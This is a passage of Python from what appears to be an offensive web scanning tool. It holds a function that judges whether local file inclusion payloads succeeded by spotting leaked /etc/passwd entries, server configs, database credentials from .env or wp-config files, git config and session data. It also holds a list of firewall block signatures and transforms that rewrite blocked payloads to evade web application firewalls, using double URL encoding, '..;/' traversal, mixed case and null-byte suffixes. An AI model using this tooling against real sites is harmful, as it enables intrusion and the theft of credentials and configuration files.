# Generic WAF / IPS response signatures (status-code checks are separate).
WAF_SIGNATURES = [
    "blocked by", "web application firewall", "mod_security", "modsecurity",
    "access denied", "request rejected", "cloudflare", "incapsula", "sucuri",
    "distil", "you have been blocked", "security violation", "not acceptable",
    "forbidden",
]

MAX_BODY_BYTES = 2 * 1024 * 1024  # cap downloads to 2MB per response

# --------------------------------------------------------------------------
# Detection markers per payload family
# --------------------------------------------------------------------------

def is_lfi_successful(payload, response_text):
    lower = response_text.lower()
    if "root:x:" in response_text and ("passwd" in payload or payload == "/etc/passwd"):
        return True
    if "apache/2." in lower and "apache2.conf" in payload:
        return True
    if "nginx/1." in lower and "nginx.conf" in payload:
        return True
    if "[boot loader]" in lower and ("win.ini" in payload or "boot.ini" in payload):
        return True
    if ("db_username" in lower or "db_password" in lower) and (
        ".env" in payload or "config.php" in payload or "wp-config" in payload
    ):
        return True
    if "php://filter" in payload:
        stripped = response_text.strip()
        if len(stripped) > 8 and re.fullmatch(r"[A-Za-z0-9+/=\s]+", stripped):
            return True
    if "\"remote\"" in lower or "url = https://" in lower:
        if ".git/config" in payload:
            return True
    if "get /" in lower and "access.log" in payload:
        return True
    if "user_id" in lower and "sess" in payload:
        return True
    if "root:" in response_text and "environ" in payload:
        return True
    return False


def is_waf_blocked(status, response_text):
    if status in (403, 406, 429, 501):
        return True
    lower = response_text.lower()
    return any(sig in lower for sig in WAF_SIGNATURES)

# --------------------------------------------------------------------------
# WAF bypass transforms - applied to a blocked payload, strongest first
# --------------------------------------------------------------------------

def _pre_url_encode(s):
    # Every send_fn in this script transmits values through
    # urllib.parse.urlencode(), which already applies one layer of percent
    # encoding on the wire. Pre-encoding here ONCE more is what actually
    # produces double-encoding at the wire - encoding twice here would
    # overshoot to triple-encoding and miss a WAF that only decodes once
    # extra internally.
    return urllib.parse.quote(s, safe="")


def _dot_semicolon(s):
    return s.replace("../", "..;/").replace("..\\", "..;\\")


def _mixed_case(s):
    return "".join(ch.upper() if i % 2 else ch for i, ch in enumerate(s))


def _append_null(s):
    return s if s.endswith("%00") else s + "%00"


BYPASS_TRANSFORMS = [
    ("url-encode", _pre_url_encode),
    ("dot-semicolon", _dot_semicolon),
    ("mixed-case", _mixed_case),
    ("null-byte-suffix", _append_null),
]

